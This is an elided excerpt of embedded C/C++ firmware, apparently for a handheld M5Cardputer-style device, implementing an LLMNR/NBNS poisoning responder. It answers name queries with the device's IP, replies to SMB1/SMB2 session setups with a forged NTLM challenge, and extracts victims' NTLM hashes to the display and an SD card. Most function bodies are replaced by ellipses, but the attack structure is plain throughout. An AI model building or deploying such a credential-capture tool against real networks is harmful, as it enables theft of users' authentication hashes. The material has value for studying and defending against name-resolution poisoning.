...
void buildNTLMType2Msg(uint8_t *challenge, uint8_t *buffer, uint16_t *len) {
  ...
  *(uint32_t *)(buffer + 44) = NTLM_HEADER_SIZE + targetLen;
  ...
  for (int i = 0; i < (int)strlen(netbiosName); i++) {
...
void updateHashUI() {
  ...
  // 5) Query
  tft.setCursor(5, 105);
  snprintf(buf, sizeof(buf), "%s: %s", lastQueryProtocol.c_str(),
           lastQueryName.c_str());
  tft.print(buf);
}
...
void extractAndPrintHash(uint8_t *pkt, uint32_t smbLength, uint8_t *ntlm) {
  ...
  // 8. Save sur SD
  if (!setupSdCard()) {
    Serial.println(F("SD not mounted, cannot save hash"));
    return;
  }
...
void handleSMB1(uint8_t packet[], uint32_t smbLength) {
  ...
  if (command == 0x73) { // SMB_COM_SESSION_SETUP_ANDX
    ...
    if (memcmp(ntlm, "NTLMSSP", 7) == 0 &&
        (uint32_t)smbLength > (uint32_t)andxOffset + 8) {
      uint8_t type = ntlm[8];
...
** Description:             Main function to start LLMNR Poisoning and wait for
* Clients Interection
***************************************************************************************/
void responder() {

  tft.fillScreen(willyConfig.bgColor);
  // M5Cardputer.Display.setTextColor(willyConfig.priColor,
  // willyConfig.bgColor);
  if (!wifiConnected)
    wifiConnectMenu();

  String tmp_name = keyboard("Willy", 20);
  ...
  String tmp_dns = keyboard("Willy.Local", 20);
      ...
      if (len >= 50) { // taille minimale d'une requête NBNS standard ~50 octets
        ...
        if ((flags & 0x8000) == 0 && qdCount >= 1 && qType == 0x0020 &&
          ...
          if (len >= 46 && buf[12] == 0x20) {
            ...
            resp[60] = ip[2];
            resp[61] = ip[3];
            // char decoded[16]; // Removed unused variable
        ...
        if (smbState.client.read(nbss, 4) == 4) {
          ...
          if ((int)smbLength == 0) {
            ...
            if (!packet) {
              ...
              if ((uint32_t)smbState.client.read(packet, smbLength) ==
                  smbLength) {
                ...
                if (smbLength >= 64 && packet[0] == 0xFE && packet[1] == 'S' &&
                  ...
                  // Session Setup Request
                    ...
                    // Chercher "NTLMSSP"
                    int ntlmIndex = -1;
                    for (uint32_t i = 0; i < (uint32_t)smbLength - 7; ++i) {
                    ...
                    if (ntlmIndex >= 0 &&
                        (uint32_t)ntlmIndex + 8 < (uint32_t)smbLength) {
                      ...
                      if (ntlmMsgType == 1) {
                        ...
                        *(uint16_t *)(resp + 4 + 70) =
                        ...
                        extractAndPrintHash(
                            ...
                            (uint32_t)smbLength, // longueur totale SMB
